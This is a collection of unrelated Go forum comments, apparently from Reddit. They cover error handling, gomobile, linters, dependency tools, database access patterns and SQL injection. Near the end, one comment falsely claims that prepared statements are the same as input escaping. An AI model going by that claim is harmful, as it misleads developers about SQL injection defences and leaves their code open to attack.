That post really helped me with Go's error handling. TLDR; check for the *behaviour* of the error, not the concrete type. type Temporary interface { IsTemporary() bool } _, err := canFail(..) if temp, ok := err.(Temporary); ok { // handle the temporary error If temp.IsTemporary() { //... } } Hope this helps!
/u/Akkifokkusu's code shows how to create internal nodes. To access the internal nodes, you would need a type switch, since Data is an empty interface: https://play.golang.org/p/8tJ_882lUs 
Nothing at all to do with [Oktalyzer](http://www.robotplanet.dk/amiga/oktalyzer/)?
What are you hoping to accomplish, exactly?
Good point, you're unlikely to hear unbiased opinions in here. In my **biased** opinion, Go is a great language. As you mentioned, it's a "no bullshit" approach and has very good concurrency patterns. On the other hand, Go requires some extend of copy-pasting and code generation if you need things like generics or an ORM. This sounds bad but I've found it to work in practise well enough (especially being able to patch the ORM is neat)
Running an inspection library I wrote in Go, I have found at least these examples. I'm sure I could find more that return aliases for `[]byte` if I checked, but here's a few to name some. Package: httputil Interface: BufferPool Method: func Get() []byte Package: http Interface: http2headersOrContinuation Method: func HeaderBlockFragment() []byte Package: macho Interface: Load Method: func Raw() []byte Package: cipher Interface: AEAD Method: func Seal(dst, nonce, plaintext, additionalData []byte) []byte Package: tls Interface: macFunction Method: func MAC(digestBuf, seq, header, data, extra []byte) []byte Package: tls Interface: constantTimeHash Method: func ConstantTimeSum(b []byte) []byte Package: tls Interface: handshakeMessage Method: func marshal() []byte Package: hash Interface: Hash Method: func Sum(b []byte) []byte Edit: I've now included the package names for you to have a look if you'd like. Edit 2: I actually just realized you asked for a single method interface, so the above probably are incorrect for that question. Here are the single method ones from the above: Package http: Interface: http2headersOrContinuation Method: func HeaderBlockFragment() []byte Package tls: Interface: constantTimeHash Method: func ConstantTimeSum(b []byte) []byte Package macho: Interface: Load Method: func Raw() []byte Edit 3: The only single method interface out of the above that doesn't implement any other interfaces is the `Load` from the `macho` package one.
That's sweet, thanks for sharing! It'd be awesome to turn it into a cmdline tool that could construct queries that match patterns. Then we could run these type of queries as a one-liner; making *Inspect* a great compliment to *Go Guru*. I'm not suggesting *you* do this, per se, since it would be a lot of work and I'm sure you have your hands full. I'm just thinking out loud.
Yes [@eliasnaur](https://github.com/eliasnaur) already answered on [github](https://github.com/golang/go/issues/17945#issuecomment-289205892). The problem was that the gobind tool didn't reverse bind the unexported fields. Don't know when it will be merged in the *gobind* tool but for now it runs when I export the new field :) type MainActivity struct { app.AppCompatActivity binding databinding.ActivityMainBinding F lang.Object //exported } Now I've problems that when I want to embed the `app.AppCompatActivity` in the `MainActivity` and then add the `WebView` as a field: type MainActivity struct { app.AppCompatActivity MyWebView webkit.WebView } then the *gobind* tool will print out that I want to embed two types in `MainActivity` and that isn't allowed. But `MyWebVIew webkit.WebView` isn't embedding, so I'm not sure if I've made an mistake or this is another reason to open a new issue on github. PS: the sanity of a programmer is often in danger :D try to not overdo it :)
I'm not the busiest person lately so that isn't much of a problem :P If I or someone else was going to turn it into a cmd line tool rather than just a library, I might consider first rewriting some of it to make it a bit better (it's not too bad at the moment I suppose), but then again, could be a fun idea :P
The way I have done it is to have one schema to store the organisation information along with a unique randomly generated id (bigint) called _orgid. This _orgid is stored in a foreign key in all the other schemas. This makes sure that every entry in the db is assocaited with an organisation. Then this _orgid is stored in the session or passed as argumets across the code base and is used in every db query. The _orgid can be fetched from the autentication or through the subdomain. This makes sure that a particular users can only manipulate the data belonging to their organisation.
This is very wrong. Golang doesn't have OOP and you shouldn't use it like this. What go offers is embedding and it's really not anything close to OOP, might look like it's OOP, but it's not. What you have is `User` struct containing a `BaseModel` field, and your `BaseModel.Get` is trying to access the user table which makes it really tied to your user anyway. When you do `sqlx.Get` you are setting the `BaseModel` field and none of the `User` fields because the `Get` method on the `BaseModel` doesn't even have access to any of the `User` fields and doesn't even know that it's part of another struct. The `Get` method is called with the `BaseModel` as receiver not `User` receiver. 
&gt; When you call json.Unmarshal it will then call your UnmarshalJSON method and if you decode logic is good you're done! &gt; Implementation: You could unmarshal the dynamic object into a map[string]interface{} which will be a combination of []string and map[string]string. Then just iterate over the map, type assert and extract the values appropriately. Thanks, I managed to get it working based on your example. Btw is handling dynamic data this "difficult" in all statically typed languages as in go? I generally have experience with dynamic typing only so far, where it just kinda works.. But then again no type safety. 
Trying to write OOP in Go is going to leave you very sad and disappointed - there is no concept of inheritance here and if there is it's a very limited one. Try to figure out the Go way of doing things instead.
I use Jenkins to ssh into my digital ocean server, got a git pull, build my go binary, then build it into a docker container, stop the old one and start the new one. That's pretty much it! Here's an example: https://gist.github.com/EwanValentine/8441ab15030b100f60bf3423bf9f7c8d 
Why doesn't rust have range integers ? You know, when you can create a type like "an integer value between 1 and 12", for instance. I'm serious there. Ada has them and I love it. Since they compete in the same niche (safe low-level programing), and since Ada had them for about 45 years now, I'm wondering why this feature is not present. Now if you want a full-featured language you'd rather complain with the rust team. They seem much more open to the idea of adding features to their language.
No idea, I have tried to play around SCADE.io which use Swift and compile native app to iOS and Android. What more, if design UI need to be consistent for both platforms, it use SVG. Seem easy to get started. Could you get Go running any Android SDK?
Redshift is -mostly- protocol compatible with PostgreSQL, so any pg client should work fine.
I'm French, and French is not very well suited for singing. There are lots and lots of French songs, but the language in itself sounds very flat, as opposed to, say, Italian or Spanish. Or even English. English is a much more flexible language than French, too, making it easier to create new words from older, existing words. And mathematical notation is better at expressing certain ideas than natural language, be it French, English or anything. Whether you call them tools or mediums for expressions, some languages fit better than others in any given situation.
Before you start adding features, look into using the cobra and viper libraries. It makes managing and using a CLI application much easier, and supports config file parsing for a variety of flavours (YAML, TOML etc) out of the box. Plenty of large projects now use both of the above, and they're easy and very flexible to use.
I have worked with Redshift extensively in Go using the [lib/pq](https://github.com/lib/pq) Postgres package and never had any issues with it. 
I'm not sure exactly what you mean - which hole, what problem, etc are you referring to?
&gt; `fmt.Errorf("problem getting user %s so i cant promote: %v, id, err)` Please don't do this. These will lose the original error context (in case there was one) so the codebase user (me for example) can't access it anymore using reflection or any other means. The Error() method doesn't always fully print the internal structure. If you want to add context use https://github.com/pkg/errors Many thanks in advance.
Thanks for the update, I was about to recommend reaching out to him if you were still having issues. Good luck, and keep blazing the trail, we have had great success using gomobile to generate sdk libraries but we've yet to do a pure go app or use reverse bindings. 
 * This is go, writeHosts and writeVhosts can happen at once (Eg. "go" and WaitGroup them). * Use the open(".tmp") + write + rename; trick for the files. 
I've been successfully using gomobile bind to generate sdk applications for several months. It's a great way to share logic across ios and android and once you get it set up, it just works. There are some limitations of the data types that can be used in your exported interface, and those are documented on the wiki https://godoc.org/golang.org/x/mobile/cmd/gobind Other than that, anything that is pure go seems to work including networking, file io, and I've imported libraries such as bolt and used those. I haven't specifically used /x/crypto but no reason it shouldn't work. I'd recommend watching the more current video from Elias Naur at http://www.thedotpost.com/2016/10/elias-naur-make-mobile-programming-fun-again to get a glimpse into reverse bindings, which I'm avoiding for now, but they are working. 
Updated the blog/tests to use bufio - much faster. Thanks for the suggestion!
I'd be more convinced if it wasn't for the [2038 problem](https://en.wikipedia.org/wiki/Year_2038_problem). Are there real-world values which don't fit in int64? Sure. Distance to the Oort cloud in mm, for example. We're only a power of 10 away from the GDP of the EU being too large, when you shift by the 4 digits of precision required for EU financial rules. I still think it's better to have code be slow and correct by default, and let people pick limited data types if they need the speed and have done the range analysis.
Pretty sure `.dev` GTLD is owned by Google now. I actually know this second-hand helping a mate fix resolver configs across a fleet of servers that used a .dev prefix, but resolver search would hit public DNS before internal DNS and thereby return 127.0.53.53.
I'd recommending building up that VHosts document/string and only making a single write. 
Pretty bare bones, I'll offer some advice around what I do for local development domains. Personally I use .test since there is no chance it will ever resolve or become a gltd. Using a real gltd cplus cause a unfortunate security incident depending what you are working on. But dnsmasq can allow you to setup a wildcard dns to forward all *.test domains to local host. Depending how you structure projects you may setup a single vhost in apache to go to /some/path/${request host} and you can symlink or directly use that sir when started new projects pretty easily.
Is it? Oh I didn't know about that :/ thanks
The "problem" (and I wrote it in quotes originally) is the issue under discussion: that an argument can be made that the example shown is a potentially difficult-to-locate memory leak that may be useful to solve not just for the memory leak issue, but additionally for the utility of fixing it. The "hole" (which was not in quotes originally) is the infinitely waiting unreachable goroutine which constitutes a memory leak, and the difficulty of reasoning about it. It's a double-edged sword: should the language increase the complexity of it's simple and concise specification and implementation in an effort to benefit developers. What makes it tricky is that it's essentially impossible to determine whether the developer intended to use the functionality or simply created a bug. Sweeping bugs under the table without a trace makes them very difficult to locate in the first place. :-)
Is the project a library/package or a binary?
I believe you can force it to search locally before using your ISP DNS.
The way I see it, this change won't affect the language spec or the behavior of any running Go program. It will potentially change the stack trace of a Go program that crashed (or, maybe, the stack of cleared goroutines can be preserved?). It will have some runtime cost, but to me the cost seems low.
Nice project! It would be awesome if you ever thought about sharing your code. I've been thinking about trying out an RC quad copter in the future with Go running the show. While it's two different concepts of flight, I'd be particularly interested in more details on your handling of the communications.
the help text calls them arguments not subcommands but fair enough
I've just packed https://github.com/tgulacsi/prometheus_scollector into the lightweight Docker image, so end user should run at least following containers: - https://hub.docker.com/r/diyan/scollector/ - https://hub.docker.com/r/diyan/prom-scollector-exporter/ - Containers with Prometheus Server, AlertManager, etc I'm totally agree with you - it's much better to integrate code from tgulacsi/prometheus_scollector right into the scollector codebase. ...and you should not worry about pull-based model (all implementation details are hidden inside https://github.com/prometheus/client_golang) except port number. There is a convention to use different port numbers by different exporters, port range is tcp/91xx. You can check which ports are already used by exporters here - https://prometheus.io/docs/instrumenting/exporters/ As an option you can just pick the same port as tgulacsi/prometheus_scollector which is tcp/9107. I'm quite sure there should be a page in the Internet with listed ports and exporters but haven't found it yet :) I hope this could help you.
&gt; Running the app as root will do it but is not desirable, I read that Nginx/apache do some magic to temporarily become root, open the port, then become the www-data user to achieve this. I am not sure if Caddy does this too, I've been meaning to check that out some time. There are workarounds for that but they're kind of ugly e.g. https://packages.debian.org/stable/authbind Authbind actually works pretty well on Debian based distros but I couldn't get the CentOS port to work. :(
I gave a talk about gomobile at the FOSDEM this year, you could see it here https://www.youtube.com/watch?v=OaSkOjew1D4&amp; the first bit wasn't recorded. I didn't have an iOS device, I could only talk about android development, I found it "rock solid", didn't have a problem with my go code besides what android API allows you, for example, USB communication was possible, but you need to ask permission in Android first, and pass the file descriptor to go. Writing/reading files on the internal memory works out of the box, but for the external memory (SD, or what it's mounted when you connect it to the computer) wasn't that easy (again, you need to open the file in java and pass the FD to go),... internet works out of the box too.
One gotcha to be aware of when using bindata is switching back to development mode. The command supports generating debug "assets" that actually read from disk so that you don't have to re-build the whole app each time you make a file change, and then you only generate the real asset files when building a binary to be deployed. When using a `go:generate` directive for this, you lose the flexibility to switch between the two easily.
They shape the way you think about the your problem and the way you think about problems shape which languages you prefer. It works both ways.
The given JSON would be difficult to work with using Json Schema, RAML and other API specification tools. Even in dynamic languages, you'd have to do an if-else on type that would be quite similar to unmarshalling into an interface{}, it's just more glaring in a strongly typed setup that guessing at the schema by looking at the content is not ideal. There are cases where it's valid design to switch the type of an attribute, like where you have a standardized message header (particularly in message buses with a Canonical Data Model and things like ReplyTo or CorrelationID fields). In those cases though, it's useful to have another field that determines the type of the content. Go supports that sort of use-case using json.RawMessage. 
&gt; I should say, doesn't change the semantics. It will change the amount of memory used by the program, which could effect a change in behavior. My point is that there's a big difference (IMHO) between what a garbage collector has traditionally done (free space that is no longer referenced) and this proposal, which extends that definition to: frees the space that is no longer referenced AND goroutines that DO hold the ONLY reference to a channel sending to... &gt; For your "imagine this", I don't really get it. If you "lose" a reference, that means your code doesn't use something. Which means it can be cleaned up. Right, but and I'm OK with garbage collecting the lost reference. It's the goroutine that I'm uncomfortable with. &gt; Only thing that would change in a way that matters is the stack trace, and perhaps that could be special-case saved, or we just admit it's unneeded. How would this change the stack trace?
Which generic proposal do you consider good for Go? I couldn't find any without great problems.
1) cobra and viper are by the same author, no? 2) would you be so kind to add some kind of argument as to which part is designed poorly/what you prefer in other comparable packages as better design?
A nice little tool for learning. I just want to point out though that there is an easy way to avoid having to juggle hosts file entries for local development domain names. You can just use dnsmasq. I understand you may know about this already and have chosen to just make this to mess around though.
It is, but you can't register .dev domains can you?
`dep` can never be "the" solution because the Go community will realize `go get` can never stop working; the world of documentation, howtos, tutorials, Dockerfiles etc will all be broken if that happens and in many ways this is as bad as breaking Go1 compatibility itself. no matter what we are stuck with `go get`. the best outcome for `dep` is to be the preferred second tool i'm frankly surprised to hear Russ discuss `get` and `dep` as possibly being mutually exclusive...that will also have to be a Go2 activity. 
Yeah, I don't disagree lol.
Is scollector working for you inside a docker container? I have not yet gotten it fully working, likely because of various files that need to be mounted as volumes to make things like cpu/memory monitoring work properly.
Got it! That makes sense now :) Thank you.
dep must work with go get, on this we agree.
Thanks, that cleared things up for me too.
and what is connection with go? 
I actually just started working on the same thing after forking someone else's because I didn't like how it was designed. I also have a [TwiML library](https://github.com/BTBurke/twiml) that complements the REST API but lacks documentation. There's an example implementation of a Google voice-like service [here](https://github.com/BTBurke/twilio-voice). Looks good so far. I was thinking of a bit different implementation, but I'll keep an eye on yours so maybe I don't have to finish mine. 
Thanks! The actual hardware I'm using for communication is an XBee Pro Series 1...Those just provide a wireless serial interface, and then my strategy for communication values was to just make my own lightweight protocol that both the controlling client and the robot hardware make use of: https://github.com/slobdell/droneLanguage Entities are converted to raw bytes, base64 encoded, and then sent to the other machine.
I initially thought the same thing. It looks like Twilio has not released an official Go client.
Why?
Well, this may sound like a weak argument... GoAccess written in Golang.
Reasons? Not my reasons, not my criteria for inclusion.
Yes, I know. I should update alpine image which has those features.
Very cool. I think tools that help us visualize and explore Go source code will be useful insomuch as they support interactive exploration and querying. As it stands now, the graph is a dump of data that's difficult to untangle. If we could query for specific aspects of that graph, then we get closer to supporting interactive exploration. Once you achieve interactivity, I don't see any reason why this couldn't become a helpful part of a developer's workflow. Great start /u/gmarik.
i usually build in a docker container (alpine) and them just copy the binary in to another container that only has the binary (plus whatever else the application needs) i have an example of that in my golang project template repo https://github.com/lacion/cookiecutter-golang/blob/master/%7B%7Bcookiecutter.app_name%7D%7D/Dockerfile.build
It is the unfortunate truth that Masterminds are deeply involved with dep. To be honest, when I first saw that they are gonna get involved in the dep project, my hopes for a good dependency solution were momentarily shuttered. While I do appreciate their work, I feel that they are just missing this "simplicity vibe" that comes out of other well-thought Go solutions and general work. Everything that comes out of them feels unnecessary complex. At least that's my impression. That said, the dependency problem is incredibly complex so later I thought maybe they are exactly what we need for this so I stopped thinking negatively and just crossed my fingers. Besides, there are many other great members involved in the dep project (and one core Go team member if I am not mistaken) and in the end Masterminds do have some experience in this problem domain. Not only that but as it has been mentioned before in this thread by Peter Bourgon, in order to solve this problem we need *the* package manager. It has to be universally accepted across the board. Having many different competitors (think glide, dep etc) in this particular case is harmful because it fragments the community. So for me reading that the engine behind dep is also gonna be used by glide was great news. But the best news by far was seeing Russ Cox being careful and cautious about all this. While I really, want a solution asap and it's very easy to fall victim to the hype train, I'd rather wait even more than get stuck with a bad solution. I am really glad the Go team is finally considering this seriously. Only good can come out from this experiment. I have already started using dep for a few projects in order to provide feedback and I suggest everyone to do the same. Good feedback makes good software.
Uhm the 2038 problem is fairly well solved by transitioning to 64 bit ints at the system level. Applications not updated for this may break. While its very 1979 of me to say this, while we're running into some problems with this already, if your application was coded correctly, it wouldn't have been using a system timestamp technique to work with future dates. As for embedded systems, most of the work I've done there with updating or rewriting older software for different microcontrollers has involved checking for, and correcting this issue. Its not a big deal, memory or speed-wise, to have 128bits total of machine register sized variables to represent NTP style time on even the slowest of modern microcontrollers. Code dealing with large amounts of time in small increments, and code written to the specification of external regulation or laws are two times where you would use a specific library designed, or certified, for that purpose. I've seldom seen builtin language constructs to manipulate financial ledgers in professionally produced software; it has usually been some third party blackbox library or RPC or web service that gives officially correct answers, ESPECIALLY when calculating taxes (to hell with VAT, and the ludicrous US sales tax situation). Built in types should match host machine's types in a systems language. Go already has libraries to deal with the need for arbitrary sized/precision numbers for applications.
Another pro you have missed, static linking resolves library dependency hell when deploying applications to various systems, which might or might not be alike.
Thanks! As a pretty new programmer who learned JS first, pointers can be kind of confusing! But I do see the advantages.
Are you sure about the Set? I can't find it in issues, and looking at the code, it seems it handles this case with a deep search: https://github.com/spf13/viper/blob/80ab6657f9ec7e5761f6603320d3d58dfe6970f6/util.go#L253 (Comment says a new *nested* entry will be created for each key, and I'm too lazy to spin up a test, but I can verify that this particular case is not in the _test.go files). // In case intermediate keys do not exist, or map to a non-map value, // a new map is created and inserted, and the search continues from there: // the initial map "m" may be modified! Also, you are not forced into the singleton, the `New()` is exposed, so you may create any number of vipers as you want: import "github.com/spf13/viper" func main() { v1 := viper.New(); v2 := viper.New(); // ... } I still can't say that somehow viper is an example of bad design, and I think in the end it's all about how you're making configuration available to different parts of your apps. Context? Pass as an argument? Part of a struct? Comes down to your patterns of use I guess - I still can't say I found a good way myself :)
Oops. My deepest apologies. You are right, it's written in C and there is no connection to the /r/golang. I will try to be more accurate.
when looking at https://github.com/robphoenix/trawl/blob/master/main.go#L62 I would have skipped the go func() around New and related channel and processed the interfaces serially unless it took a significant amount of time. 
Did they change the layout of gopheracademy recently?
What are you hoping to accomplish with your question? :-D
Every path I pass in (including the example paths from your readme) returns an empty digraph. Go 1.8, windows/amd64 if it helps to debug what might be happening. I skimmed the code but didn't see anything standing out as an obvious source of this silent error. Edit: Alright it looks like paths just need to be surrounded in quotes, maybe the readme should be updated.
To understand your motivation, your intent. It's not exactly a question that I've ever come across, or a need. Mainly because there's usually a reason for conforming to an interface, i.e., not simply blind conformance. And I'm assuming, you have a reason... unless you don't. In other words, I'm looking for the root cause of your question. Make sense?
a newbie's overuse of concurrency :) thanks.
Your modules should look like this. type Foo struct { db *sql.DB // ... } func NewFoo(db *sql.DB, ...) *Foo { return &amp;Foo{ db: db, // ... } } Pass database handles to object constructors explicitly. Don't use package-global state.
lots of good answers here: https://www.reddit.com/r/golang/comments/5vsz2t/what_is_the_best_way_to_pass_a_db_to_web_handlers/
Here's what I do. pkg.FuncThatUsesDB(db) // or thing := pkg.NewThingThatNeedsDB(db) thing.MethodThatUsesDB() 
that's seems be to be the best way i've seen so far, but in that case my http handlers are going to be functions attached to Foo ? e.g: func (f *Foo) ListSomeFoos(w http.ResponseWriter, r *http.Request) { // do some stuff f.DB.Query() }
Is Go a systems language? I didn't think that was a widespread view, given that you can't do manual memory management.
http://www.alexedwards.net/blog/organising-database-access Request-scoped context passing the db instance within the context 
GitHub has always been a mirror for the main source code: Go itself, and the /x/ repositories. That's where Gerrit pushes changes to. GitHub is only used for the issue tracker and wiki (etc).
This is indeed the idiomatic way to do it. But http handlers are not methods. So the question is how to pass the database to these handlers ? Apparently, the db has to be a global variable. That is not so nice. 
Full disclosure - I'm Dev Evangelist at ActiveState - but I'm here essentially to be the voice of Developers inside ActiveState so happy to answer questions, gather feedback. It's ActiveState's first new language release in awhile, so we're anxious to hear from people!
Thank you!
There are speed differences but they are really small for it to ever be a problem for this usecase.
OP here. Oh? I haven't heard... searching reading now. Please point me to any specific articles. Personally I've used SafeInCloud locally with my own sync for years as i didn't trust online password managers (see an old blog post of mine: http://eduncan911.com/software/security/password-managers-are-not-immune-to-hacks-themselves.html ). but lastpass has been used at a number of banks and other gigs I've been at that became pretty standard and I kind of got used to it. Was just about to finish my conversion (have about 150 cards left to go, out of the 700 i need to import). But now your post raises an alarm I need to investigate. Thanks for the heads up!
Why should you use this instead of the official distribution?
Actually, http handlers can be methods. For example, if you want to break up your handlers into "controllers", you would have something like: package user type UserController struct { db *sql.DB } func NewController(db *sql.DB) *UserController { return &amp;UserController{db:db} } func (u *UserController) Login(w http.ResponseWriter, r *http.Request) { // validate input u.db.GetUser() // more stuff } Then your main would be something like: func main() { db := db.NewDB() controller := user.NewController(db) http.Handle("/user/login", controller.Login) http.ListenAndServe(":8080", nil) } The link that /u/miko5054 posted provides a great example. It goes more in depth with this concept, like using an interface instead of taking in the concrete db.
Alarm! Calling technicians in sector 4! A leak in the cryochamber "codesenberg" was detected. // first gometaliter commit: Aug 5, 2014
[removed]
So what specifically is different from the official distribution?
So the core language is the same - it's not a fork - and we'd want to keep it that way. What's different is that the distro comes bundled with a bunch of pre-compiled packages, all of their documentation, as well as a bunch of tools (delve, goimports, golint, etc.) so that you don't necessarily need to do a lot of configuration, pulling packages, etc. The full list of packages included is too long to list here - and as a beta release certainly isn't exhaustive - so definitely open to suggestions on things to include.
I imagine most all Go developers here see right through this crap, but if you don't please do not use this. You are placing the security of your system in the hands of this company for zero benefit. They don't put their builds through the same test cycles as the Go team I'm certain. They have zero info on release page and to top it off the download page is over http with no checksums, the download itself is also over http: http://downloads.activestate.com/ActiveGo/releases/1.8.0.0-beta/ActiveGo-1.8.0.0-beta-win64.exe This post should just be deleted for being unsafe and potentially malicious. What a joke.
some remarks (I just skimmed over the source): - you should [use prepared statements instead of constructing the queries yourself](http://stackoverflow.com/questions/8263371/how-can-prepared-statements-protect-from-sql-injection-attacks), otherwise you have to sanitize the strings to prevent SQL injections (e.g. in the getUpdateQuery) - by using a global connection and using it directly in the model, you make testing more difficult, because you have to use a real database instance for testing - the license of the project is missing - make sslMode a new type, and use constants to represent a new value (disable is a really bad default value for remote connections, imho) - the setup function should not panic (panic in a library is really bad for the developers using it) and return an error to allow the user to react accordingly (e.g. use another server to connect to) - allow for `context.Context` easy cancellation - you can use `db.Ping()` on a `database/sql`-DB to verify the connection
Not really, but methods are more readable imo. Between the struct and method declaration, you can quickly see all the variables the method can access. To do the same thing with closures, you have to read through the whole function that created the closure. 
I use gometalinter every month or so and batch-fix whatever it finds. Like you said, it's far to slow to use as a regular part of development.
Here are some things I spotted: * [This conversion](https://github.com/robphoenix/trawl/blob/0a9b/main.go#L43) is really unnecessary, since [ipify.GetIP](https://godoc.org/github.com/rdegges/go-ipify#GetIp) already returns a `(string, error)` pair; * [This](https://github.com/robphoenix/trawl/blob/0a9b/main.go#L56) can be simplified with [bitwise operations](https://pastebin.com/Gh1WkAbV); * After applying previous tip you can get rid of [strings package](https://github.com/robphoenix/trawl/blob/0a9b/main.go#L8).
Direct quote from that article &gt;Personally I'm not a fan of storing application-level variables in request-scoped context – it feels clunky and burdensome to me. The x/net/context documentation kinda advises against it too: &gt;&gt;Use context Values only for request-scoped data that transits processes and APIs, not for passing optional parameters to functions.
i use gometalinter in vscode and it's the best... it can get a little crazy with errors sometimes, but it's all good information that reminds me to do the right things.
[removed]
Your problem is that that input data isn't Base32 encoded. Base32 encoding only uses the characters A-Z (capital only), 2-7, and =. 
Hello, I'm the author of gometalinter. Unfortunately more and more linters are becoming slower and slower. You can run gometalinter with --fast to exclude these, but at this stage that is most of them :(
I run it at least daily, because it can legitimately help me head off errors before they become an issue.
gometalinter --fast
gofmt is great until it removes your imports and doesn't know how to re-add them and goimports doesn't either and the only reason it was removed is because it won't compile if you temporarily don't use it so debugging is a mess until you put _ = yourimport all over your code that shouldn't even be there in the first place. Go is a nice language but I always have this urge to patch it into a more relaxed mode that doesn't get in your way while debugging and experimenting with things.
Eh, I've been developing Go for a few years now, so it's mostly just eliminating warnings now for me (mostly intentionally ignored errors). But I do occasionally see value in it.
what exactly "precompiled packages" even mean in go context? precompiled to what format? 
You work at Zenly ? Nice ! I love it ! 
Still faster than debugging a bug.
Let us not forget [`staticcheck`, `gosimple`, and `unused`](https://github.com/dominikh/go-tools). These should be mandatory in any CI system.
Good call, I've added that in
I updated the code on the playground. The implementation is something simple just to get the float values. https://play.golang.org/p/9iSk7s6Nst As a reference, the first values should be : [21,248.82 6,523.70 799.10 ...] Also, the exact same code works for the 64-bit encoding data, but not for this one 
Even more unfortunate when we are forced to use cgo.
errcheck is the only one that actually prevents bugs. unconvert might help catch refactoring bugs in the future. That's it. Most Go linters are obnoxious and pedantic. 
That changed a couple months ago, at least for tools that use x/tools/go/loader. Nowadays, go/loader does the same cgo preprocessing that go build does, i.e. it invokes C compilers and generates the appropriate Go code. Some tools may report funky line numbers (which can be fixed), but they won't fail to check your code anymore.
I have a section in my Makefile to fmt and lint my Go projects. Then, I set it up as a pre-commit hook. Easy.
Still faster than catching things in a code review too.
I disagree. You are completely discounting the value of having consistent, idiomatic, well-documented, readable code.
&gt; arbitrary structs Good luck!! You will fail but I wish you all the best and hope you won't hurt yourself too much. "Arbitrary" means it may contain self referential structures "Arbitrary" means it may contain potential infinite data like linked lists with circles. "Arbitrary" means it may contain channel types, possibly buffered channels with values in them. "Arbitrary" means it may contain stuff which must not be copied like sync.Mutex "Arbitrary" means it can contain unsafe pointers or C stuff. Drop arbitrary from your list of requirements and think about what types you really need to transmit. Probably it boils down to simple non-recursive, finite value types. Think about how you would like to use the deserialized form: Into what shape/type/data-structure would you like it to be deserialized. There aren't too many (sensible) possibilities: "slice of ...", "map from ... to ...", "tree of ...", you get it. Which is easy to use? Which is homogeneous? Thinks which wire format would allow to construct such a deserialisation. JSON is fine, the deserialization as map[string]interface{} is almost as good as it will become. Other formats to consider: S expressions or XML. 
Just an educated guess: Maybe you have 32bit floats encoded as base64? 
&gt; You are most likely doing something wrong. You comment out a bit of code and just want to run and compiler goes boopbopbop you can't do that and/or imports got removed and compiler goes boopbopbop when commenting the code back in. Even the FAQ admits "it's common to create these situations temporarily when developing code" and proposes _ as a solution. https://golang.org/doc/faq#unused_variables_and_imports And yea, I probably mixed up goimports and gofmt (the way it's used as output filter in editors, it amounts to the same thing). (Go's handling of imports being so crazy annoying seems to be the raison d'être of goimports in the first place. Problem is it only works well for the standard library.)
I fixed it few hours agi
Thanks for the points, they are much appreciated. I am working on moving to prepared statements, but having some issues with the database whining about syntax. New tests are being written, and they will run against a real database on Travis. License was added, and connection checking is now using `db.Ping()`. Also going to remove the panics and return an error instead. Edit: So the parts that use field values (potentially controlled by a user) now use proper statements to prevent injection, tests have been written and are run by Travis, and overall the project got a bit healthier. Thanks!
I would very strongly suggest that you consider the tuples to be a serialization method, and that by default you will serialize and deserialize these into well-typed structs. You can provide operations to query the tuple space or manipulate the tuple space directly to your hearts content, but no matter what you do, you have to have a layer in the interface where the user has to cast all these interface{} values into concrete types anyhow, so it might as well be a nice deserialization step, rather than requiring a lot of type assertions. You'll also want to understand the difference between a serialization format, and the code that supports it. `encoding/json` is pretty much entirely unsuited to what you want to do. Even if you could bash it into compliance, it'll be almost entirely by hacks and overriding a ton of stuff. It is possible you could develop what you want with another JSON library, though, you'd have to look around. `encoding/xml` is closer, as it has the capability of decoding different kinds of concrete structs into an interface value, by keying off of the tag name. But it still is a bit limited. Gob is more flexible. A final alternative is to write your own wire format. You're going to be grunging around in Go reflection code anyhow before you're done, so you're going to be 80% of the way there before you're done anyhow. It may be the case, depending on your needs, that your optimal solution is simply to learn reflection, write the serialization and deserialization you're looking for, and once you have that in hand to do the relatively minor extensions of the code at that point to go ahead and write up your own wire format. Just some thoughts.
So its kind of a subset of the go ecosystem that you can use, if you cant download anything from github? (for whatever reasons) 
[http://grpc.io](http://grpc.io)
yeah I think that's fine. There's really too levels of linting anyway; when you're coding, and want to lint on the fly / on save, and in your CI pipeline.
Hum.. yes that makes sense for sure. I swapped all 64's for 32's on the URL posted above and the numbers still don't match...
What about this one https://github.com/saintpete/twilio-go ?
Well, if you really wanted to understand my motivation - then that's fine. "hoping to accomplish" reminded me more of "you are doing it wrong, I will show you" for which I have no interest in. My motivation was: If there was a common stdlib that a user of my library would include anyway and that had a conforming interface, I would use this as part of my API. If not, I would have an anonymous interface as part of function signatures. The reason is: The user of my library should not have any reference (via any type) to my lib apart from the top level boilerplate inside main. So that it is easy to switch underlying libraries.
I'm aware of the history, but I don't view web development as systems programming.
Do not pass `testing.T` to code outside of the package. Instead let it return `err` and then do `t.Fail(err)` locally.
Definitely. I was primarily a Node developer, but we decided to use Go for a few internal APIs at my company for a variety of reasons. For a while I was definitely writing my Go programs like Express/Node apps. I had questions just like this and learned mostly through trial and error and looking at a lot of other repos. One of the most helpful projects for me to look at was [go-kit](https://github.com/go-kit/kit) (thanks /u/peterbourgon)! It really helped me develop a better mindset of how the pieces fit together in a Go project (e.g. large main func tying dependencies together/satisfying DI interfaces, endpoints vs services, middleware granularity). We're really satisfied with the result. It's trivially testable, new team members have been able to jump on and add features, and our complexity is isolated to places where it makes sense (mostly vague business requirements :D). Now when I write Node programs they look like Go programs.... 
OK, I fixed the issue. I changed all 64's to 32's and I changed the counter from == 8 to == 4. Thank you all for helping
Write SQL? sqltext := ` select a.ID, al.Amount from Account a join AccountLine al on al.Account = a.ID where a.ID = :Account and al.Amount &gt; :Thresh ` rows, err := db.QueryContext(ctx, sqltext, Named("Account", 42), Named("Thresh", 9000)) 
I didn't saw this one, it looks great, I'll check if it's easily usable/mockable for my usage. 
&gt; If that's the method used, then you have no idea what line/etc the imported tests failed on. Nothing prevents `err` to say that ;-)
`go build -ldflags="-s" ...`
&gt; You need input escaping. Is input escaping bulletproof? My understanding from the past two decades is that escaping is not completely bulletproof. It's a blacklist strategy. If the library developers make a mistake implementing it, something goes through. With prepared statements, there is no concern for this at all. https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#Defense_Option_4:_Escaping_All_User_Supplied_Input &gt; sqlx is the most popular complement to the standard library. Saves you time while being fast (enough) and simple. That's my current top candidate.
I don't know where you read that crap but input escaping is literally what prepared statements do, input escaping is the act of turning semantically significant characters into simple text. And as far as prepared statements go, many Go DB drivers use prepared statements in the background for performance reasons anyway.
